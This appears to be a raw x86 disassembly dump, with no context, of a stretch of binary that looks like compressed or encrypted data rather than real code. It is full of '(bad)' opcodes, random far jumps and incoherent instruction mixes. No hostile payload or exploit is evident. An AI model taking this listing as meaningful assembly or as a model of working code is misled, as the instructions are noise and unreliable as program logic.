  41d26c:	add    BYTE PTR [eax],al
  41d26e:	rol    BYTE PTR [edi+ebx*2+0x45300895],0x58
  41d276:	push   esi
  41d277:	jmp    0x41d231
  41d279:	pop    ss
  41d27a:	fucomi st,st(6)
  41d27c:	pop    ebx
  41d27d:	scas   eax,DWORD PTR es:[edi]
  41d27e:	xchg   esi,eax
  41d27f:	leave  
  41d280:	mov    al,0xef
  41d282:	ret    0xe9ef
  41d285:	or     DWORD PTR [ebx+ebx*1],esp
  41d288:	pop    esi
  41d289:	sahf   
  41d28a:	test   DWORD PTR [edi+0x70],ebp
  41d28d:	fwait
  41d28e:	push   ss
  41d28f:	fidivr WORD PTR [edi-0x58]
  41d292:	inc    ecx
  41d293:	fldenv [ecx]
  41d295:	gs or  al,0x8f
  41d298:	js     0x41d2d7
  41d29a:	mov    WORD PTR [ecx+0x79],fs
  41d29d:	test   BYTE PTR [esi+0x17aa1779],ch
  41d2a3:	fistp  WORD PTR ds:0xc21bcee7
  41d2a9:	dec    esi
  41d2aa:	test   eax,0xa9077b90
  41d2af:	fdiv   st(0),st
  41d2b1:	imul   DWORD PTR [ebp+eax*8-0x3d]
  41d2b5:	push   edx
  41d2b6:	loop   0x41d25a
  41d2b8:	jb     0x41d325
  41d2ba:	outs   dx,BYTE PTR ds:[esi]
  41d2bb:	push   edx
  41d2bc:	in     eax,0x7c
  41d2be:	dec    edx
  41d2bf:	gs push edx
  41d2c1:	and    DWORD PTR [esi-0x2a],esi
  41d2c4:	push   ebx
  41d2c5:	test   BYTE PTR [eax-0x6e458b62],ah
  41d2cb:	dec    edx
  41d2cc:	mov    ds:0x38a263c8,al
  41d2d1:	(bad)  
  41d2d3:	sbb    DWORD PTR ds:0x64cbbb0b,edx
  41d2d9:	or     al,0x83
  41d2db:	add    BYTE PTR [edi],bl
  41d2dd:	pop    ss
  41d2de:	xor    eax,0xbfc6083c
  41d2e3:	ds loope 0x41d32b
  41d2e6:	sbb    DWORD PTR [eax-0x4c97f338],edi
  41d2ec:	and    eax,0x96cec8c5
  41d2f1:	mov    dl,bl
  41d2f3:	repnz fs push ecx
  41d2f6:	imul   esp,DWORD PTR [edx+0x16],0x79
  41d2fa:	push   es
  41d2fb:	retf   0x46ba
  41d2fe:	(bad)  
  41d2ff:	popa   
  41d300:	lods   al,BYTE PTR ds:[esi]
  41d301:	ss cmp eax,0x37c55429
  41d307:	fcom   DWORD PTR [edi]
  41d309:	push   edi
  41d30a:	add    DWORD PTR [ebp+eax*4-0x7da4fbb1],0x5d
  41d312:	test   eax,0x3eaa265e
  41d317:	jmp    0x41d2b0
  41d319:	test   BYTE PTR [edi-0x44],dh
  41d31c:	test   dl,al
  41d31e:	in     eax,dx
  41d31f:	aas    
  41d320:	test   DWORD PTR es:[esi-0x7c],edx
  41d324:	jb     0x41d2a8
  41d326:	popa   
  41d327:	repz dec ecx
  41d329:	or     al,0x24
  41d32b:	cmc    
  41d32c:	push   ebx
  41d32d:	mov    ds:0x885c5c64,eax
  41d332:	das    
  41d333:	or     esp,esi
  41d335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d336:	pushf  
  41d337:	jmp    0x420487f1
  41d33c:	aaa    
  41d33d:	ins    DWORD PTR es:[edi],dx
  41d33e:	dec    esp
  41d33f:	scas   eax,DWORD PTR es:[edi]
  41d340:	retf   0x1921
  41d343:	add    BYTE PTR [ebp-0x4519d1d1],dl
  41d349:	sbb    DWORD PTR ds:0x3b670885,esp
  41d34f:	sar    BYTE PTR [edx+0x638b292a],1
  41d355:	and    edi,DWORD PTR [eax]
  41d357:	mov    bl,0xbf
  41d359:	out    0x13,al
  41d35b:	push   es
  41d35c:	sbb    edx,edi
  41d35e:	leave  
  41d35f:	shl    BYTE PTR [eax-0x55f66f6c],cl
  41d365:	lahf   
  41d366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d367:	les    esp,FWORD PTR [eax+edi*2]
  41d36a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d36b:	pop    esi
  41d36c:	nop
  41d36d:	xor    al,BYTE PTR [eax]
	...
  41d3d3:	add    BYTE PTR [eax],al
  41d3d5:	add    dh,bh
  41d3d7:	cmp    cl,0x54
  41d3da:	(bad)  
  41d3db:	jge    0x41d3dc
  41d3dd:	stos   BYTE PTR es:[edi],al
  41d3de:	lea    ebp,[edi]
  41d3e0:	shr    BYTE PTR [ecx+0x65],0xeb
  41d3e4:	int3   
  41d3e5:	sub    esp,DWORD PTR [edi+0x3a]
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	add    BYTE PTR [ecx],al
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	push   ebp
  41d3ef:	call   FWORD PTR [esi]
  41d3f1:	and    al,0x1a
  41d3f3:	xchg   ebp,eax
  41d3f4:	data16 faddp st(1),st
  41d3f7:	add    DWORD PTR ds:0x342bf6a8,esp
  41d3fd:	cmp    DWORD PTR [eax+0x1b],edx
  41d400:	xchg   esi,eax
  41d401:	(bad)  
  41d402:	nop
  41d403:	mov    esp,DWORD PTR [edx-0x76]
  41d406:	mov    eax,DWORD PTR [ebx]
  41d408:	sub    al,0x94
  41d40a:	stos   BYTE PTR es:[edi],al
  41d40b:	dec    ebx
  41d40c:	int    0xbb
  41d40e:	int3   
  41d40f:	add    cl,bl
  41d411:	ror    BYTE PTR [ecx-0xbc80c8a],1
  41d417:	outs   dx,BYTE PTR ds:[esi]
  41d418:	jle    0x41d486
  41d41a:	je     0x41d455
  41d41c:	retf   
  41d41d:	scas   eax,DWORD PTR es:[edi]
  41d41e:	addr16 jne 0x41d3a7
  41d421:	inc    ebx
  41d422:	aaa    
  41d423:	pop    ebx
  41d424:	hlt    
  41d425:	sub    dl,BYTE PTR [ecx-0x23]
  41d428:	xchg   ecx,eax
  41d429:	cs jb  0x41d3b2
  41d42c:	call   0x93190416
  41d431:	je     0x41d415
  41d433:	push   ss
  41d434:	adc    DWORD PTR [eax+0x6a4c1c47],eax
  41d43a:	or     edx,DWORD PTR [eax]
  41d43c:	pop    DWORD PTR [ecx+0x18bd10f9]
  41d442:	dec    eax
  41d443:	outs   dx,DWORD PTR ds:[esi]
  41d444:	pushf  
  41d445:	enter  0x7bbf,0x9d
  41d449:	xchg   esi,eax
  41d44a:	(bad)  
  41d44b:	jecxz  0x41d46a
  41d44d:	sbb    BYTE PTR [ebx+0x2770b027],ah
  41d453:	pop    esp
  41d454:	xchg   edi,eax
  41d455:	or     bl,bh
  41d457:	or     eax,0xbf3e79d4
  41d45c:	sub    bh,bl
  41d45e:	mov    edi,0xf69ff152
  41d463:	jle    0x41d4e3
  41d465:	daa    
  41d466:	mov    eax,0x51150a50
  41d46b:	(bad)  
  41d46d:	mov    eax,ds:0xac55965c
  41d472:	pop    edx
  41d473:	or     eax,DWORD PTR ds:0xbdb0c414
  41d479:	loope  0x41d420
  41d47b:	bound  ebx,QWORD PTR [edi-0x4ee7951a]
  41d481:	js     0x41d41b
  41d483:	scas   al,BYTE PTR es:[edi]
  41d484:	call   0x59e03c96
  41d489:	mov    ebp,0x5c337c87
  41d48e:	mov    bh,0x4f
  41d490:	pop    edx
  41d491:	push   eax
  41d492:	mov    BYTE PTR [edi+0x7f32a994],cl
  41d498:	(bad)  [edi+ebx*1-0x5f466c94]
  41d49f:	adc    DWORD PTR [edx+eiz*8+0x24],0x262090d7
  41d4a7:	mov    DWORD PTR [ebp+0x72496aeb],esi
  41d4ad:	jo     0x41d4c0
  41d4af:	add    DWORD PTR [ebx-0x68d7f4cc],ecx
  41d4b5:	(bad)  
  41d4b6:	fucomip st,st(1)
  41d4b8:	pusha  
  41d4b9:	outs   dx,BYTE PTR ds:[esi]
  41d4ba:	xor    al,0xf3
  41d4bc:	cmp    eax,0x108d4a95
  41d4c1:	leave  
  41d4c2:	mov    ch,0x86
  41d4c4:	or     bh,BYTE PTR [edx]
  41d4c6:	(bad)  
  41d4c7:	and    esp,DWORD PTR [ebp-0x7fb3a9a2]
  41d4cd:	lea    esi,ds:0xbfe7dcd7
  41d4d3:	push   cs
  41d4d4:	xor    al,0xbb
  41d4d6:	outs   dx,BYTE PTR ds:[esi]
  41d4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4d8:	mov    ds:0xcb607135,al
  41d4dd:	sub    bl,BYTE PTR [edx+0x57]
  41d4e0:	jp     0x41d55a
  41d4e2:	xor    eax,0xe44b1cc2
  41d4e7:	adc    dl,al
  41d4e9:	ret    0x26b7
  41d4ec:	imul   eax,DWORD PTR [edx+0x0],0x0
	...
  41d554:	add    BYTE PTR [eax],al
  41d556:	div    BYTE PTR [esi]
  41d558:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x67ae:0xf83c0f89
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [eax],al
  41d56f:	or     DWORD PTR [ecx+ebx*8],0x2c
  41d573:	lea    ecx,[ebp-0xd]
  41d576:	adc    BYTE PTR [esi-0x55c7c165],dl
  41d57c:	aad    0x7
  41d57e:	nop
  41d57f:	daa    
  41d580:	dec    esi
  41d581:	adc    DWORD PTR [eax+ebx*4+0x56],esp
  41d585:	jnp    0x41d551
  41d587:	ficom  WORD PTR [edx+0x414df199]
  41d58d:	sbb    eax,esi
  41d58f:	pop    ecx
  41d590:	mov    ah,0x55
  41d592:	adc    ecx,esi
  41d594:	retf   0x2d9c
  41d597:	add    BYTE PTR [ecx+eax*1+0x51],0xe3
  41d59c:	outs   dx,BYTE PTR ds:[esi]
  41d59d:	leave  
  41d59e:	inc    esi
  41d59f:	mov    eax,0xd666132e
  41d5a4:	pop    eax
  41d5a5:	loopne 0x41d5a2
  41d5a7:	mov    bl,0xe7
  41d5a9:	adc    dh,BYTE PTR [ecx+0x2f]
  41d5ac:	imul   ecx,DWORD PTR [esi],0x30f6dc05
  41d5b2:	and    al,0x15
  41d5b4:	sub    esi,DWORD PTR [ecx-0x373cd6d4]
  41d5ba:	dec    edx
  41d5bb:	fisttp DWORD PTR [ebx+0xa358b8c]
  41d5c1:	mov    ebp,0x7b90798d
  41d5c6:	in     al,dx
  41d5c7:	(bad)  
  41d5c8:	cdq    
  41d5c9:	pop    edi
  41d5ca:	add    al,0x94
  41d5cc:	mov    esp,0x16cae197
  41d5d1:	ret    
  41d5d2:	mov    edx,0x3b0ec577
  41d5d7:	bound  eax,QWORD PTR [eax]
  41d5d9:	fcom   QWORD PTR [edi]
  41d5db:	stos   BYTE PTR es:[edi],al
  41d5dc:	mov    ecx,0xe83689e8
  41d5e1:	adc    edx,0xffffff91
  41d5e4:	or     al,0x7b
  41d5e6:	jb     0x41d5a9
  41d5e8:	mov    al,0xa
  41d5ea:	xlat   BYTE PTR ds:[ebx]
  41d5eb:	hlt    
  41d5ec:	xchg   edi,eax
  41d5ed:	mov    ah,0x1f
  41d5ef:	fsubrp st(5),st
  41d5f1:	jle    0x41d638
  41d5f3:	sub    al,BYTE PTR [edx+edx*4+0x13]
  41d5f7:	push   esp
  41d5f8:	xchg   edx,eax
  41d5f9:	jmp    0xaa4fa2e6
  41d5fe:	in     al,0xdc
  41d600:	repz add DWORD PTR [esi+0x4a],edx
  41d604:	inc    esi
  41d605:	push   ebp
  41d606:	mov    esi,0x6d143597
  41d60b:	mov    ds:0x7377405a,al
  41d610:	aas    
  41d611:	sahf   
  41d612:	loope  0x41d5d2
  41d614:	mov    edx,DWORD PTR [eax-0x44]
  41d617:	jp     0x41d637
  41d619:	pusha  
  41d61a:	outs   dx,BYTE PTR ds:[esi]
  41d61b:	repnz pop eax
  41d61d:	sbb    DWORD PTR [eax+0x11],0x197ef25c
  41d624:	inc    esi
  41d625:	pop    ss
  41d626:	pop    ss
  41d627:	sbb    dl,al
  41d629:	and    al,0x9
  41d62b:	arpl   WORD PTR [eax+edx*4+0x51fe8ec6],dx
  41d632:	jmp    0x6a164a4d
  41d637:	jnp    0x41d5d1
  41d639:	cmp    ah,cl
  41d63b:	jecxz  0x41d5c8
  41d63d:	pop    es
  41d63e:	mov    ebp,0xd8c27796
  41d643:	dec    eax
  41d644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d645:	push   ebx
  41d646:	cli    
  41d647:	cmp    eax,0xd4d12da5
  41d64c:	or     dl,cl
  41d64e:	aas    
  41d64f:	xor    eax,0x9c82b50e
  41d654:	addr16 xchg edx,eax
  41d656:	sbb    dl,BYTE PTR ds:0x587a731d
  41d65c:	je     0x41d5fd
  41d65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d65f:	xchg   ecx,eax
  41d660:	popa   
  41d661:	add    DWORD PTR [ebx+0x50],eax
  41d664:	outs   dx,DWORD PTR ds:[esi]
  41d665:	shr    DWORD PTR [esi-0xc85f1ca],1
  41d66b:	jo     0x41d622
  41d66d:	add    BYTE PTR ds:[eax],al
	...
  41d6d4:	add    BYTE PTR [eax],al
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0x4c66e435
  41d6e3:	(bad)  
  41d6e5:	adc    esp,DWORD PTR [edi+0x3c]
  41d6e8:	add    DWORD PTR [eax],eax
  41d6ea:	add    BYTE PTR [ecx],al
  41d6ec:	add    BYTE PTR [eax],al
  41d6ee:	pushf  
  41d6ef:	cdq    
  41d6f0:	pop    edi
  41d6f1:	scas   al,BYTE PTR es:[edi]
  41d6f2:	(bad)  
  41d6f4:	into   
  41d6f5:	inc    esi
  41d6f6:	ss sbb ch,al
  41d6f9:	nop    ebp
  41d6fc:	pop    ss
  41d6fd:	adc    eax,0xa4330915
  41d702:	and    BYTE PTR [esi+0x71],bh
  41d705:	repz add edi,ecx
  41d708:	out    dx,eax
  41d709:	and    BYTE PTR ds:0x70042005,al
  41d70f:	mov    ebp,DWORD PTR [ecx]
  41d711:	rcl    DWORD PTR [ebp-0x45197269],1
  41d717:	fimul  DWORD PTR [ebx+0x270be808]
  41d71d:	jnp    0x41d6dd
  41d71f:	jmp    0x41d712
  41d721:	es out 0xc0,al
  41d724:	and    ebx,DWORD PTR [ecx]
  41d726:	lods   eax,DWORD PTR ds:[esi]
  41d727:	ret    0xfa01
  41d72a:	scas   al,BYTE PTR es:[edi]
  41d72b:	sbb    bl,dl
  41d72d:	repnz xor ebp,DWORD PTR [edx]
  41d730:	push   esp
  41d731:	pop    es
  41d732:	repnz data16 not BYTE PTR [ebx]
  41d736:	adc    al,0xb5
  41d738:	scas   eax,DWORD PTR es:[edi]
  41d739:	add    dh,dl
  41d73b:	sar    BYTE PTR [edx-0x1e733030],0xe5
  41d742:	sub    cl,bh
  41d744:	xlat   BYTE PTR ds:[ebx]
  41d745:	mov    ecx,0xc99e223c
  41d74a:	xor    DWORD PTR [esi],ebp
  41d74c:	jmp    0xd5bbb7db
  41d751:	outs   dx,DWORD PTR ds:[esi]
  41d752:	std    
  41d753:	sahf   
  41d754:	pop    esp
  41d755:	in     al,0x15
  41d757:	aad    0x33
  41d759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d75a:	sub    eax,0xe31816cf
  41d75f:	sub    DWORD PTR [edi-0xd],ebx
  41d762:	fnstenv [edx]
  41d764:	mov    al,0xe1
  41d766:	(bad)  [ebx+0x324df818]
  41d76c:	dec    bh
  41d76e:	daa    
  41d76f:	adc    al,0x4b
  41d771:	add    al,0x11
  41d773:	dec    edx
  41d774:	bound  esp,QWORD PTR [eax-0x39]
  41d777:	outs   dx,BYTE PTR ds:[esi]
  41d778:	stc    
  41d779:	mov    eax,ds:0x53bdc01b
  41d77e:	sbb    al,0x3
  41d780:	(bad)  
  41d781:	jle    0x41d7d0
  41d783:	pop    ebp
  41d784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d785:	push   ds
  41d786:	aas    
  41d787:	pop    ecx
  41d788:	es jge 0x41d77d
  41d78b:	outs   dx,BYTE PTR ds:[esi]
  41d78d:	adc    al,0xdf
  41d78f:	js     0x41d755
  41d791:	mov    DWORD PTR [edx],ebx
  41d793:	(bad)  
  41d794:	js     0x41d80a
  41d796:	mov    BYTE PTR [edi+0x3e],dh
  41d799:	shr    BYTE PTR [ecx-0x1d],0xab
  41d79d:	and    ebx,ecx
  41d79f:	adc    BYTE PTR ds:0xfd783e8f,ah
  41d7a5:	fild   WORD PTR [ecx+0x50]
  41d7a8:	dec    eax
  41d7a9:	lahf   
  41d7aa:	cmc    
  41d7ab:	stos   DWORD PTR es:[edi],eax
  41d7ac:	and    ecx,DWORD PTR [ecx-0x7a7f8dca]
  41d7b2:	hlt    
  41d7b3:	cld    
  41d7b4:	cwde   
  41d7b5:	inc    eax
  41d7b6:	and    al,BYTE PTR ds:[edi-0x6951d95c]
  41d7bd:	xchg   esi,eax
  41d7be:	jmp    0x92c012c4
  41d7c3:	cs push ebp
  41d7c5:	lods   al,BYTE PTR ds:[esi]
  41d7c6:	jnp    0x41d813
  41d7c8:	cmp    eax,0x3ce52879
  41d7cd:	cmp    ch,BYTE PTR [esi+eax*1]
  41d7d0:	adc    eax,0x998db9e8
  41d7d5:	mov    es,WORD PTR [edi]
  41d7d7:	out    0xa0,al
  41d7d9:	das    
  41d7da:	xchg   edi,eax
  41d7db:	cmp    bl,dh
  41d7dd:	ins    BYTE PTR es:[edi],dx
  41d7de:	(bad)  
  41d7df:	xchg   esp,eax
  41d7e0:	rcr    cl,1
  41d7e2:	cmc    
  41d7e3:	mov    esi,0xbba6dc78
  41d7e8:	arpl   WORD PTR [ebx],dx
  41d7ea:	sub    edi,DWORD PTR [ebp+0x50c0]
	...
  41d854:	add    BYTE PTR [eax],al
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	lea    ebx,ds:[edi]
  41d865:	inc    esp
  41d866:	addr16 cmp eax,0x1000001
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	dec    edx
  41d86f:	dec    esi
  41d870:	test   eax,0x96ef5283
  41d875:	fcmovb st,st(3)
  41d877:	and    edx,DWORD PTR [ebx+0xe]
  41d87a:	shl    BYTE PTR [edx],1
  41d87c:	pop    edx
  41d87d:	mov    BYTE PTR [edi+0x25dac9d6],dl
  41d883:	add    ebp,DWORD PTR [ebx+esi*8]
  41d886:	sub    eax,0xf4037c04
  41d88b:	stos   DWORD PTR es:[edi],eax
  41d88c:	(bad)  
  41d88d:	jmp    FWORD PTR [edx+ecx*1-0x6da80459]
  41d894:	pop    esi
  41d895:	jb     0x41d8a1
  41d897:	cmp    eax,0xe836f224
  41d89c:	pop    eax
  41d89d:	sub    esi,DWORD PTR [eax+0x61]
  41d8a0:	test   BYTE PTR [edi-0x147e20ff],bh
  41d8a6:	adc    DWORD PTR [edx],ecx
  41d8a8:	sbb    esi,DWORD PTR [ebx]
  41d8aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8ab:	pusha  
  41d8ac:	mov    ebp,0x1b054c7d
  41d8b1:	adc    eax,0xdebd96f1
  41d8b6:	rol    BYTE PTR [ecx+0x2da3698d],0xb4
  41d8bd:	lods   al,BYTE PTR ds:[esi]
  41d8be:	mov    ah,0xf8
  41d8c1:	pop    es
  41d8c2:	push   cs
  41d8c3:	int3   
  41d8c4:	push   eax
  41d8c5:	xchg   esi,eax
  41d8c6:	imul   esi,DWORD PTR [eax+0x614fba72],0x2df0f020
  41d8d0:	fst    st(6)
  41d8d2:	loopne 0x41d8d0
  41d8d4:	paddusb mm4,QWORD PTR [ebx+esi*8-0x714da9ca]
  41d8dc:	lods   al,BYTE PTR ds:[esi]
  41d8dd:	sbb    eax,DWORD PTR [esi+0x3c]
  41d8e0:	add    al,0x17
  41d8e2:	mov    al,0xaa
  41d8e4:	popf   
  41d8e5:	jecxz  0x41d906
  41d8e7:	out    dx,eax
  41d8e8:	test   al,0x29
  41d8ea:	pop    eax
  41d8eb:	ins    DWORD PTR es:[edi],dx
  41d8ec:	pop    eax
  41d8ed:	addr16 push 0xb7e5c87f
  41d8f3:	inc    edi
  41d8f4:	ss data16 (bad) 
  41d8f7:	push   eax
  41d8f8:	sbb    BYTE PTR [eax+esi*8+0x32e27410],cl
  41d8ff:	pusha  
  41d900:	or     esi,esp
  41d902:	in     eax,dx
  41d903:	inc    edi
  41d904:	jle    0x41d8e1
  41d906:	adc    BYTE PTR [eax+0x45],dl
  41d909:	ja     0x41d8ea
  41d90b:	mov    bl,0x89
  41d90d:	in     al,dx
  41d90e:	jns    0x41d8ab
  41d910:	mov    ah,0x76
  41d912:	mov    eax,0x6d49b0df
  41d917:	ret    
  41d918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d919:	jne    0x41d93e
  41d91b:	data16 ins BYTE PTR es:[edi],dx
  41d91d:	frndint 
  41d91f:	stos   BYTE PTR es:[edi],al
  41d920:	adc    esp,ecx
  41d922:	out    0x87,al
  41d924:	(bad)  
  41d925:	push   cs
  41d926:	aad    0xee
  41d928:	sub    ch,al
  41d92a:	jno    0x41d98d
  41d92c:	and    DWORD PTR [ebp+0x3d],edi
  41d92f:	outs   dx,BYTE PTR ds:[esi]
  41d930:	movups XMMWORD PTR [ebx+0x2f],xmm6
  41d934:	mov    esp,ebx
  41d936:	push   ebp
  41d937:	adc    ecx,DWORD PTR [eax+0x7b85a76c]
  41d93d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d93e:	pop    esp
  41d93f:	inc    eax
  41d940:	loop   0x41d917
  41d942:	lock xacquire add BYTE PTR [edx],0x66
  41d947:	(bad)  
  41d94b:	and    eax,0xc56c38f9
  41d950:	mov    eax,0xd645bf9
  41d955:	pop    eax
  41d956:	dec    esi
  41d957:	xchg   ecx,eax
  41d958:	xchg   esp,eax
  41d959:	pop    ss
  41d95a:	jno    0x41d95f
  41d95c:	and    DWORD PTR [ebx+0x51babfa6],esi
  41d962:	pop    edi
  41d963:	push   cs
  41d964:	rol    BYTE PTR [ebp-0x651d845e],0xe1
  41d96b:	shr    BYTE PTR [eax],0x29
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs out 0x77,al
  41d9e4:	pop    ss
  41d9e5:	push   esi
  41d9e6:	add    DWORD PTR ds:[bx+si],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	bound  eax,QWORD PTR [ecx+esi*4+0x5b0b0ab2]
  41d9f5:	mov    edx,0x58000960
  41d9fa:	(bad)
  41d9fe:	mov    esi,0xe14c86ea
  41da03:	mov    al,0xec
  41da05:	sub    DWORD PTR [ebp+eax*2-0x5e922f30],ecx
  41da0c:	popa   
  41da0d:	or     dh,BYTE PTR [ebp+0x256dc382]
  41da13:	hlt    
  41da14:	gs xchg edx,eax
  41da16:	sbb    ah,BYTE PTR [ebx-0x54]
  41da19:	and    BYTE PTR [edi+0x1ab73ec3],bl
  41da1f:	xor    eax,0xffffffc5
  41da22:	out    dx,al
  41da23:	nop
  41da24:	sub    DWORD PTR [ecx+0x5f],edi
  41da27:	arpl   cx,si
  41da29:	sbb    al,BYTE PTR [edx]
  41da2b:	dec    eax
  41da2c:	pop    eax
  41da2d:	or     al,0xeb
  41da2f:	mov    al,ds:0x69de3fc7
  41da34:	not    DWORD PTR [eax-0x67]
  41da37:	ins    DWORD PTR es:[edi],dx
  41da38:	push   ebp
  41da39:	repnz shl BYTE PTR [esi],cl
  41da3c:	mov    dh,0xcc
  41da3e:	dec    ebp
  41da3f:	dec    edx
  41da40:	push   esi
  41da41:	or     DWORD PTR [ebx],ebx
  41da43:	and    BYTE PTR [ecx-0x274e5b96],0x8f
  41da4a:	fidiv  WORD PTR ds:0x9c852e32
  41da50:	call   FWORD PTR [ebp-0x72]
  41da53:	sub    dh,BYTE PTR [ebp+ebx*8+0x32]
  41da57:	in     al,dx
  41da58:	dec    eax
  41da59:	sbb    bh,BYTE PTR ds:0xdc7ca634
  41da5f:	fcomp  DWORD PTR [edx-0x45]
  41da62:	jl     0x41dabb
  41da64:	xor    BYTE PTR [edi],cl
  41da66:	inc    ecx
  41da67:	and    al,0x7f
  41da69:	imul   esp,DWORD PTR [esi+0x4401871d],0x38
  41da70:	ret    0x5d6e
  41da73:	sub    esp,DWORD PTR [eax-0x45]
  41da76:	shr    BYTE PTR gs:[edx+eiz*8+0x751fbcde],0x12
  41da7f:	mov    bl,0xe
  41da81:	push   eax
  41da82:	ins    BYTE PTR es:[edi],dx
  41da83:	ret    0xcd60
  41da86:	push   cs
  41da87:	lahf   
  41da88:	imul   eax,ecx,0xffffff80
  41da8b:	dec    ebp
  41da8c:	fmul   QWORD PTR [ebx-0x29]
  41da8f:	(bad)  
  41da90:	xor    BYTE PTR [ecx+eiz*2],cl
  41da93:	push   edx
  41da94:	push   edx
  41da95:	pop    ebp
  41da96:	leave  
  41da97:	shl    DWORD PTR [ebx-0x62],1
  41da9a:	lock rcl DWORD PTR ss:[esi-0x7b],cl
  41da9f:	xor    dl,bh
  41daa1:	mov    DWORD PTR [edi+0x6644f60d],esp
  41daa7:	jo     0x41da4e
  41daa9:	(bad)
  41daac:	je     0x41da52
  41daae:	inc    esp
  41daaf:	mov    DWORD PTR [esi],ecx
  41dab1:	arpl   bx,cx
  41dab3:	stc    
  41dab4:	mov    ch,0xf6
  41dab6:	sbb    eax,0xf21357ae
  41dabb:	push   ecx
  41dabc:	jge    0x41da75
  41dabe:	mov    ds:0xf906490e,eax
  41dac3:	jge    0x41daf7
  41dac5:	xchg   ecx,eax
  41dac6:	mov    esi,0xe73871e0
  41dacb:	scas   al,BYTE PTR es:[edi]
  41dacc:	leave  
  41dacd:	gs dec edx
  41dacf:	retf   
  41dad0:	(bad)  
  41dad1:	xchg   edi,eax
  41dad2:	dec    ebx
  41dad3:	or     BYTE PTR [edx+0x5df835df],cl
  41dad9:	rcl    edi,0xb3
  41dadc:	fwait
  41dadd:	sub    DWORD PTR [esi-0x13],ebp
  41dae0:	jo     0x41daa2
  41dae2:	in     eax,0xb
  41dae4:	call   0x642f37f7
  41dae9:	mov    dl,0xb3
  41daeb:	int3   
  41daec:	sub    DWORD PTR [eax],ecx
	...
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0xffffff9a
  41db63:	sbb    ebx,DWORD PTR [esi]
  41db65:	mov    dh,0x67
  41db67:	aas    
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	xchg   edx,eax
  41db6f:	fwait
  41db70:	iret   
  41db71:	jmp    0x41db1d
  41db73:	xchg   ecx,eax
  41db74:	scas   al,BYTE PTR es:[edi]
  41db75:	pop    esi
  41db76:	cmc    
  41db77:	out    dx,eax
  41db78:	jmp    0x5bb7:0xf0a22244
  41db7f:	xchg   esi,eax
  41db80:	scas   al,BYTE PTR es:[edi]
  41db81:	retf   
  41db82:	or     ch,BYTE PTR [eax+0x58c5f10b]
  41db88:	loopne 0x41dbc3
  41db8a:	pop    eax
  41db8b:	call   0x1143fc59
  41db90:	pop    esp
  41db91:	sti    
  41db92:	push   0x39b2f23d
  41db97:	push   edi
  41db98:	ss xchg bl,ah
  41db9b:	stos   DWORD PTR es:[edi],eax
  41db9c:	add    DWORD PTR [edx+0x3],esi
  41db9f:	xlat   BYTE PTR ds:[ebx]
  41dba1:	sub    bl,BYTE PTR [ecx]
  41dba3:	int    0xee
  41dba5:	add    DWORD PTR [ebp+0x6affb873],eax
  41dbab:	mov    bh,0x3e
  41dbad:	mov    DWORD PTR [ecx+0x47cc06ff],ebx
  41dbb3:	(bad)  
  41dbb4:	dec    edi
  41dbb5:	sbb    BYTE PTR [ebx-0x63],0xdb
  41dbb9:	mov    DWORD PTR [edx+0x63],edi
  41dbbc:	xor    ebx,edx
  41dbbe:	inc    esp
  41dbbf:	mov    ebx,0xcd5bcebc
  41dbc4:	inc    ebp
  41dbc5:	dec    ebp
  41dbc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc7:	jo     0x41dc42
  41dbc9:	hlt    
  41dbca:	xchg   ecx,eax
  41dbcb:	add    al,0x1c
  41dbcd:	shl    DWORD PTR [ebx],0xf4
  41dbd0:	call   0x9d0de490
  41dbd5:	jo     0x41dc06
  41dbd7:	jle    0x41dc15
  41dbd9:	and    cl,BYTE PTR [esi-0x25]
  41dbdc:	les    ebp,FWORD PTR [esi+ecx*4-0x49b4a7e9]
  41dbe3:	shr    DWORD PTR [edi+esi*1+0x6b],1
  41dbe7:	(bad)  
  41dbe9:	icebp  
  41dbea:	dec    esp
  41dbeb:	shr    esi,0xc5
  41dbee:	fsub   DWORD PTR [esi+0x9]
  41dbf1:	jmp    0x41dc4f
  41dbf3:	sbb    eax,0x6f94f95d
  41dbf8:	daa    
  41dbf9:	jb     0x41dbab
  41dbfb:	sub    edi,ebp
  41dbfd:	mov    al,0x35
  41dbff:	imul   edx,ecx,0x9
